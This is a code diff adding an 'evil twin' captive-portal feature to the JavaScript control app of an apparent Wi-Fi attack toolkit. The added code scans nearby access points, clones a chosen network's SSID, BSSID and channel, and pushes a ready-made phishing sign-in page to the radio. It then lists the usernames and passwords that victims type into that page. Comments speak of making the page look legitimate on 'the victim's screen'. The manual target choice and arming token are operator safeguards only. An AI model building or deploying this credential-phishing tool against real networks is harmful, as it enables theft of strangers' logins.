@@ -16,6 +16,10 @@ import { extractHandshakes, hashFile } from './crack.js';
 import { importCapture, describeImport } from './import.js';
 import { takeSharedCapture } from './native-import.js';
 import { CrackBridge } from './bridge.js';
+import {
+  PORTAL_ARM_TOKEN, portalArm, rankTwinCandidates, selectTwinTarget,
+  twinRejectReason, portalPageChunks, parsePortalSubmission,
+} from './portal.js';
 import './gps.js';    // window.GPS
 import './hashstore.js'; // window.HashStore
 import './wardrive.js';  // window.Wardrive
@@ -240,6 +244,24 @@ function onEvent(json) {
       syncAfterBurst();
     }
     if (state.stage === 'capture') renderStagePanel();
+    return;
+  }
+  if (json.event === 'portal_submission') {
+    // The radio hands over what somebody typed into the twin's page. It is held
+    // in memory on this phone only — the firmware never writes it to flash, and
+    // the panel's clear button is the only thing that drops it.
+    portalSubs.push({
+      user: String(json.user ?? ''),
+      pass: String(json.pass ?? ''),
+      ip: String(json.ip ?? ''),
+      blank: !!json.blank,
+      ms: Number(json.ms ?? 0),
+      at: Date.now(),
+    });
+    log('ev', `portal: a submission arrived from ${json.ip || 'a client'}`);
+    // paintPortal, not renderStagePanel: a full re-render would wipe the page
+    // textarea out from under an operator editing it when this lands.
+    if (state.stage === 'attack') paintPortal();
     return;
   }
   // 'stage' and 'hb' describe the DEVICE's radio state. state.stage is the
@@ -977,6 +999,7 @@ function renderAttackPanel(box) {
       ${a.id === 'handshake' ? deauthActionHtml(a) : ''}
       ${a.id === 'karma' ? karmaActionHtml(a) : ''}
       ${a.id === 'mana' ? manaActionHtml(a) : ''}
+      ${a.id === 'portal' ? portalActionHtml(a) : ''}
       ${a.id === 'mousejack' ? mousejackActionHtml(a) : ''}
     </div>`;
   }).join('');
@@ -1106,6 +1129,18 @@ function renderAttackPanel(box) {
   $('#manaGo')?.addEventListener('click', onManaStart);
   $('#manaStop')?.addEventListener('click', onManaStop);
   $('#manaRefresh')?.addEventListener('click', pollManaStatus);
+  // Portal — the twin. Scan seeds it, a human picks, the token arms it.
+  $('#portalScan')?.addEventListener('click', onPortalScan);
+  $('#portalPick')?.addEventListener('change', onPortalPickCandidate);
+  $('#portalGo')?.addEventListener('click', onPortalStart);
+  $('#portalStop')?.addEventListener('click', onPortalStop);
+  $('#portalRefresh')?.addEventListener('click', pollPortalStatus);
+  $('#portalPush')?.addEventListener('click', onPortalPushPage);
+  $('#portalPageDefault')?.addEventListener('click', () => {
+    const el = $('#portalPage');
+    if (el) { el.value = PORTAL_DEFAULT_PAGE; localStorage.removeItem('portalPage'); }
+  });
+  $('#portalSubsClear')?.addEventListener('click', () => { portalSubs = []; renderStagePanel(); });
   $('#manaDefaults')?.addEventListener('click', () => fillDefaults('manaList'));
   $('#manaBssidRandom')?.addEventListener('click', () => {
     const el = $('#manaBssid');
@@ -2389,6 +2424,365 @@ function boot() {
 
 document.addEventListener('DOMContentLoaded', boot);
 
+
+// ── the portal: the twin a client actually lands on ──────────────────────────
+//
+// This is the app half of firmware/src/portal.h. Modules are pure and main.cpp
+// replies, so nothing here builds anything the radio sends — it seeds a twin
+// from a scan, asks a human to choose one, arms it with the token, pushes the
+// page in chunks, and shows what somebody typed.
+//
+// Three things here are deliberate, and each is easy to "fix" into something
+// wrong:
+//   * The twin is NEVER auto-picked. rankTwinCandidates orders candidates; the
+//     operator chooses. Auto-picking the strongest clones whichever neighbour
+//     happens to be loudest — an attack on somebody who was not chosen.
+//   * The arm token is exact. 'true', '1', 'yes' and 'ARM' are all refused. It
+//     replaced SCOPE_ALLOWLIST; it is not ceremony and it is not a boolean.
+//   * The page is pushed in chunks on CHARACTER boundaries, not byte counts. A
+//     512-byte split that lands mid-UTF-8 shows mojibake on the victim's screen,
+//     which is the one screen that has to look legitimate.
+//
+// Status is painted in place rather than by re-rendering the panel: a full
+// re-render on the 2 s tick would wipe the page textarea out from under whoever
+// is typing in it.
+
+let portalRunning = false;
+let portalScanning = false;
+let portalScanAps = null;      // last /scan aps[] — the candidate pool
+let portalTwin = null;         // the operator's pick: { ssid, bssid, channel }
+let portalArmed = null;        // portalArm() verdict for the current pick
+let portalStatus = null;       // last portal_status — the RADIO's numbers
+let portalPushResult = null;   // page push outcome
+let portalSubs = [];           // submissions; memory only, never written down
+let portalTicker = null;
+
+// A deliberately generic placeholder. It is the operator's job to make it match
+// whatever the twin claims to be — shipping a branded page would be shipping a
+// claim about a network this tool does not own. It exists so the plumbing can be
+// exercised without authoring HTML first.
+const PORTAL_DEFAULT_PAGE = `<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in to continue</title>
+<style>
+ body{font:16px/1.5 system-ui,-apple-system,sans-serif;margin:0;display:grid;
+      place-items:center;min-height:100vh;background:#f4f4f6;color:#16181d}
+ .card{background:#fff;padding:26px 24px;border-radius:14px;max-width:340px;width:100%;
+       box-shadow:0 2px 18px rgba(0,0,0,.10)}
+ h1{font-size:19px;margin:0 0 6px}
+ p{color:#5a5f6a;margin:0 0 18px;font-size:14px}
+ label{display:block;font-size:13px;margin:0 0 4px;color:#333}
+ input{width:100%;padding:11px;border:1px solid #ccd0d8;border-radius:9px;font-size:16px;
+       box-sizing:border-box;margin-bottom:14px;background:#fff;color:inherit}
+ button{width:100%;padding:12px;border:0;border-radius:9px;background:#1a73e8;color:#fff;
+        font-size:16px;font-weight:600}
+</style></head>
+<body><form class="card" method="post" action="/">
+  <h1>Sign in to continue</h1>
+  <p>This network requires you to sign in before you can use it.</p>
+  <label for="u">Email or username</label>
+  <input id="u" name="username" autocomplete="username" autocapitalize="none" spellcheck="false">
+  <label for="p">Password</label>
+  <input id="p" name="password" type="password" autocomplete="current-password">
+  <button type="submit">Sign in</button>
+</form></body></html>`;
+
+/** The live numbers, from the radio's own counters. */
+function portalLiveHtml() {
+  if (!portalStatus) {
+    return `<div class="crackmeta">Not started. Scan, pick the twin, arm it, then start.</div>`;
+  }
+  if (portalStatus.error) {
+    return `<div class="crackstate">${Icon('alert', { size: 15 })}${escapeHtml(portalStatus.error)}</div>`;
+  }
+  const s = portalStatus;
+  const up = s.ap_up ? 'AP up' : (s.running ? 'AP coming up' : 'AP down');
+  return `
+    <div class="crackmeta">${escapeHtml(up)} · SSID <code>${escapeHtml(String(s.ssid ?? portalTwin?.ssid ?? '—'))}</code>
+      · channel ${escapeHtml(String(s.channel ?? portalTwin?.channel ?? '—'))}
+      · cloned BSSID: ${s.cloned_bssid ? 'yes' : 'no'}</div>
+    <div class="crackmeta">stations now ${escapeHtml(String(s.stations ?? 0))} · ever ${escapeHtml(String(s.stations_ever ?? 0))}
+      · DNS answered ${escapeHtml(String(s.dns_answered ?? 0))} / refused ${escapeHtml(String(s.dns_refused ?? 0))}
+      / unparseable ${escapeHtml(String(s.dns_bad ?? 0))}
+      · HTTP ${escapeHtml(String(s.http_gets ?? 0))} GET, ${escapeHtml(String(s.http_posts ?? 0))} POST</div>
+    <div class="crackmeta">submissions ${escapeHtml(String(s.subs_taken ?? 0))} taken, ${escapeHtml(String(s.subs_blank ?? 0))} blank
+      · page ${s.page_loaded ? escapeHtml(String(s.page_bytes)) + ' bytes' : 'none'}</div>
+    ${s.subs_queued ? `<div class="crackmeta">${escapeHtml(String(s.subs_queued))} submission(s) still held on the radio, waiting for this link.</div>` : ''}
+    <div class="crackmeta">The radio reports that the AP is up and beaconing. It cannot observe whether
+      any given device finds it, and does not claim to.</div>`;
+}
+
+/** What came back. Rendered as text, never as markup, and never written to disk. */
+function portalSubsHtml() {
+  if (!portalSubs.length) {
+    return `<div class="crackmeta">Nothing submitted yet. Whatever arrives is held in this app's memory
+      only — the radio does not write it to flash, and Clear is the only thing that drops it.</div>`;
+  }
+  const rows = portalSubs.map((s, i) => `
+    <div class="crackmeta">${i + 1}. <code>${escapeHtml(s.user || '(no username)')}</code>
+      · <code>${escapeHtml(s.pass || (s.blank ? '(blank)' : '(none)'))}</code>
+      · from ${escapeHtml(s.ip || '?')}${s.ms ? ' · ' + (s.ms / 1000).toFixed(1) + ' s' : ''}</div>`).join('');
+  return `
+    <div class="pnllist">${rows}</div>
+    <div class="row" style="margin-top:8px">
+      <button id="portalSubsClear" class="ghost">${Icon('unlink', { size: 15 })}Clear</button>
+    </div>`;
+}
+
+function paintPortal() {
+  // innerHTML, like the rest of this app's rendering. Safe here for the same
+  // reason: every dynamic value in portalLiveHtml/portalSubsHtml goes through
+  // escapeHtml first — the numbers are numeric, and the strings are an SSID and
+  // whatever somebody typed into the twin's page, which is exactly the content
+  // that must never be able to become markup.
+  const live = $('#portalLive');
+  if (live) live.innerHTML = portalLiveHtml();
+  const subs = $('#portalSubsBox');
+  if (subs) {
+    subs.innerHTML = portalSubsHtml();
+    // The Clear button lives inside the block we just replaced, so its listener
+    // has to be re-attached here rather than once at panel render.
+    $('#portalSubsClear')?.addEventListener('click', () => { portalSubs = []; paintPortal(); });
+  }
+}
+
+function portalActionHtml(a) {
+  if (!a.ready) return '';
+
+  const cands = portalScanAps ? rankTwinCandidates(portalScanAps) : [];
+  const pick = portalTwin;
+  const armed = portalArmed;
+  const armSaved = localStorage.getItem('portalArm') || '';
+
+  const candOptions = cands.length
+    ? cands.map((c) => `
+        <option value="${escapeHtml(c.bssid)}" ${pick && pick.bssid === c.bssid ? 'selected' : ''}>
+          ${escapeHtml(c.ssid || '(hidden)')} · ${escapeHtml(c.bssid)} · ${c.rssi == null ? 'rssi ?' : escapeHtml(String(c.rssi)) + ' dBm'} · ${escapeHtml(String(c.auth))}${c.cloneable ? '' : ' — ' + escapeHtml(c.why)}
+        </option>`).join('')
+    : `<option value="">— no scan yet —</option>`;
+
+  const twinLine = pick
+    ? `<div class="crackmeta">Twin target: <code>${escapeHtml(pick.ssid)}</code> on channel
+         ${escapeHtml(String(pick.channel))}${pick.bssid ? `, cloned BSSID <code>${escapeHtml(pick.bssid)}</code>` : ', own BSSID (not cloned)'}.</div>`
+    : `<div class="crackmeta">No twin chosen. A scan seeds the candidates; you pick one.</div>`;
+
+  const armedLine = armed && !armed.armed
+    ? `<div class="crackstate">${Icon('alert', { size: 15 })}${escapeHtml(armed.problems[0])}</div>`
+    : '';
+
+  const pageVal = localStorage.getItem('portalPage') ?? PORTAL_DEFAULT_PAGE;
+  const push = portalPushResult;
+
+  return `
+  <div class="crackbox">
+    <div class="crackstate">${Icon('scan', { size: 15 })}Seed the twin from the air</div>
+    <div class="crackmeta">One radio, so the twin has to sit on the target's own channel — the S3 is
+      2.4 GHz only, and a 5 GHz target cannot be twinned with this board.</div>
+    <div class="row" style="margin-top:8px">
+      <button id="portalScan" class="ghost" ${portalScanning ? 'disabled' : ''}>
+        ${Icon('scan', { size: 15 })}${portalScanning ? 'Scanning…' : 'Scan now'}</button>
+    </div>
+    <label class="field" style="margin-top:8px">
+      <span>Candidate${cands.length ? ` (${cands.length})` : ''} — ranked by signal, which is a proxy
+        for "worth the effort", not proof anyone is home</span>
+      <select id="portalPick" ${cands.length ? '' : 'disabled'}>${candOptions}</select>
+    </label>
+    ${twinLine}
+    ${armedLine}
+
+    <div class="crackstate" style="margin-top:12px">${Icon('link', { size: 15 })}Arm it</div>
+    <div class="crackmeta">The gate that replaced the scope allowlist. It must be typed, and it is
+      checked exactly — near-misses like <code>true</code> or <code>ARM</code> are refused. This is
+      the point where you say out loud that a stranger's device can join this.</div>
+    <label class="field" style="margin-top:6px">
+      <span>Arming token — required value: <code>${escapeHtml(PORTAL_ARM_TOKEN)}</code></span>
+      <input id="portalArmInput" type="text" autocapitalize="off" spellcheck="false"
+             value="${escapeHtml(armSaved)}" placeholder="type it in full — there is no default">
+    </label>
+
+    <div class="row" style="margin-top:8px">
+      ${portalRunning
+        ? `<button id="portalStop" class="ghost">${Icon('unlink', { size: 18 })}Stop the twin</button>
+           <button id="portalRefresh" class="ghost" style="margin-left:0">${Icon('refresh', { size: 15 })}</button>`
+        : `<button id="portalGo" class="primary">${Icon('link', { size: 18 })}Start the twin</button>`}
+    </div>
+
+    <div id="portalLive" style="margin-top:8px">${portalLiveHtml()}</div>
+
+    <div class="crackstate" style="margin-top:12px">${Icon('capture', { size: 15 })}The page it serves</div>
+    <div class="crackmeta">Sent to the radio in chunks and kept in its RAM, not on its flash. The
+      generic default is a placeholder — make it match what the twin claims to be, because that
+      screen is the one that has to look legitimate.</div>
+    <label class="field">
+      <span>The page HTML</span>
+      <textarea id="portalPage" rows="12" spellcheck="false" autocapitalize="off">${escapeHtml(pageVal)}</textarea>
+    </label>
+    <div class="row" style="margin-top:6px">
+      <button id="portalPush" class="ghost" ${portalRunning ? '' : 'disabled'}>
+        ${Icon('capture', { size: 15 })}Push page to the radio</button>
+      <button id="portalPageDefault" class="ghost" style="margin-left:0">Reset to default</button>
+    </div>
+    ${push ? `<div class="crackmeta">${
+      push.phase === 'done'
+        ? `Stored: ${escapeHtml(String(push.stored))} bytes in ${escapeHtml(String(push.chunks))} chunk(s).`
+        : push.phase === 'error'
+          ? escapeHtml(push.error)
+          : 'Pushing…'
+    }</div>` : ''}
+
+    <div class="crackstate" style="margin-top:12px">${Icon('key', { size: 15 })}What came back</div>
+    <div id="portalSubsBox">${portalSubsHtml()}</div>
+  </div>`;
+}
+
+async function onPortalScan() {
+  portalScanning = true;
+  renderStagePanel();
+  try {
+    // The firmware replies to /scan asynchronously, from its loop — hence the
+    // generous timeout rather than a tight one.
+    const resp = await request('SCAN', {}, { timeoutMs: 25000 });
+    if (!resp?.ok) throw new Error(resp?.error || 'the scan was refused');
+    portalScanAps = Array.isArray(resp.aps) ? resp.aps : [];
+    const cloneable = rankTwinCandidates(portalScanAps, { onlyCloneable: true }).length;
+    log('ev', `portal: scan found ${portalScanAps.length} AP(s), ${cloneable} cloneable into a PSK twin`);
+    // A fresh scan invalidates the old pick: the operator chose from what was in
+    // the air at that moment, and carrying it over would silently re-target.
+    portalTwin = null;
+    portalArmed = null;
+  } catch (e) {
+    log('err', 'portal: ' + e.message);
+  }
+  portalScanning = false;
+  renderStagePanel();
+}
+
+function onPortalPickCandidate(e) {
+  const bssid = e.target.value;
+  if (!bssid || !portalScanAps) return;
+  const ap = portalScanAps.find((x) => String(x.bssid).toLowerCase() === String(bssid).toLowerCase());
+  if (!ap) { log('err', 'portal: that candidate is no longer in the scan'); return; }
+
+  // selectTwinTarget refuses rather than substituting, so a refusal here is real
+  // information — it is not going to quietly clone something else.
+  const sel = selectTwinTarget(portalScanAps, { ssid: ap.ssid, bssid: ap.bssid });
+  if (!sel.ok) {
+    portalTwin = null; portalArmed = null;
+    log('err', 'portal: ' + sel.reason);
+  } else {
+    portalTwin = { ssid: sel.twin.ssid, bssid: sel.twin.bssid, channel: sel.twin.channel };
+    portalArmed = null;
+    log('ev', `portal: twin target is "${sel.twin.ssid}" on channel ${sel.twin.channel}`);
+  }
+  renderStagePanel();
+}
+
+async function onPortalStart() {
+  if (!portalTwin) { log('err', 'portal: scan and pick a twin first'); return; }
+  const token = $('#portalArmInput')?.value || '';
+
+  const armed = portalArm({
+    acknowledge: token,
+    ssid: portalTwin.ssid,
+    channel: portalTwin.channel,
+    bssid: portalTwin.bssid,
+  });
+  portalArmed = armed;
+  if (!armed.armed) {
+    log('err', 'portal: ' + armed.problems[0]);
+    renderStagePanel();
+    return;
+  }
+
+  localStorage.setItem('portalArm', token);
+  portalRunning = true;
+  portalStatus = { running: true, ap_up: false, ssid: armed.ssid, channel: armed.channel };
+  renderStagePanel();
+
+  try {
+    const resp = await request('PORTAL_START', {
+      ssid: armed.ssid,
+      bssid: armed.bssid || undefined,
+      channel: armed.channel,
+      captive_portal_uri: armed.captivePortalUri,
+      acknowledge: token,
+    }, { timeoutMs: 15000 });
+    if (!resp?.ok) throw new Error(resp?.error || 'the firmware refused to start the portal');
+    portalStatus = { ...resp, running: true };
+    log('ev', `portal: twin up on "${armed.ssid}" channel ${armed.channel}`);
+  } catch (e) {
+    portalRunning = false;
+    portalStatus = { error: e.message };
+    log('err', 'portal: ' + e.message);
+  }
+  renderStagePanel();
+  if (portalRunning) pollPortalStatus();
+}
+
+async function onPortalStop() {
+  portalRunning = false;
+  if (portalTicker) { clearTimeout(portalTicker); portalTicker = null; }
+  try {
+    const resp = await request('PORTAL_STOP', {}, { timeoutMs: 8000 });
+    if (!resp?.ok) throw new Error(resp?.error || 'the radio refused to stop');
+    log('ev', `portal: stopped (${resp.wiped ? 'page wiped' : 'page kept'})`);
+    portalStatus = null;
+  } catch (e) {
+    portalStatus = { error: e.message };
+    log('err', 'portal: ' + e.message);
+  }
+  renderStagePanel();
+}
+
+async function pollPortalStatus() {
+  if (!portalRunning) return;
+  try {
+    const r = await request('PORTAL_STATUS', {}, { timeoutMs: 6000 });
+    if (r?.ok) portalStatus = { ...r, running: true };
+  } catch (e) {
+    log('err', 'portal status: ' + e.message);
+  }
+  // Paint, do not re-render: a full re-render would wipe the page textarea.
+  if (state.stage === 'attack') paintPortal();
+  if (portalRunning) portalTicker = setTimeout(pollPortalStatus, 2000);
+}
+
+async function onPortalPushPage() {
+  if (!portalRunning) { log('err', 'portal: start the twin before pushing a page'); return; }
+  const html = $('#portalPage')?.value || '';
+  if (!html.trim()) { log('err', 'portal: the page is empty — a blank page is not a sign-in page'); return; }
+  localStorage.setItem('portalPage', html);
+
+  const bytes = new TextEncoder().encode(html);
+  portalPushResult = { phase: 'pushing' };
+  renderStagePanel();
+
+  try {
+    const b = await request('PORTAL_PAGE_BEGIN', {}, { timeoutMs: 8000 });
+    if (!b?.ok) throw new Error(b?.error || 'the radio refused to open the page buffer');
+
+    // Character boundaries, not byte counts — see the note at the top.
+    const chunks = portalPageChunks(html, 512);
+    let stored = 0;
+    for (let i = 0; i < chunks.length; i++) {
+      const hex = Array.from(chunks[i]).map((x) => x.toString(16).padStart(2, '0')).join('');
+      const r = await request('PORTAL_PAGE_CHUNK', { hex }, { timeoutMs: 8000 });
+      if (!r?.ok) throw new Error(r?.error || `the radio refused chunk ${i + 1} of ${chunks.length}`);
+      stored = Number(r.total ?? stored);
+    }
+
+    const end = await request('PORTAL_PAGE_END', {}, { timeoutMs: 8000 });
+    if (!end?.ok) throw new Error(end?.error || 'the radio refused to close the page');
+
+    portalPushResult = { phase: 'done', chunks: chunks.length, stored: Number(end.bytes ?? stored) };
+    log('ev', `portal: page pushed — ${chunks.length} chunk(s), ${end.bytes ?? stored} bytes on the radio (page was ${bytes.length} bytes)`);
+  } catch (e) {
+    portalPushResult = { phase: 'error', error: e.message };
+    log('err', 'portal: ' + e.message);
+  }
+  renderStagePanel();
+}
 
 // ── Karma handlers ──────────────────────────────────────────────────────────
 
